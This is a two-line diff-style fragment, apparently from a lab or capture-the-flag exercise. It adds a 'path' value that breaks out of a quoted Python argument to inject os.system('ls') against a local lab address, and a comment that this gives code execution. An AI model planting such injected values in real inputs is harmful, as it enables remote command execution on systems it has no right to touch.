@@ -1,0 +1,2 @@
+path="http://10.10.10.168:8080/',os.system('ls'),'ls"
+on local interpreter it gives rce
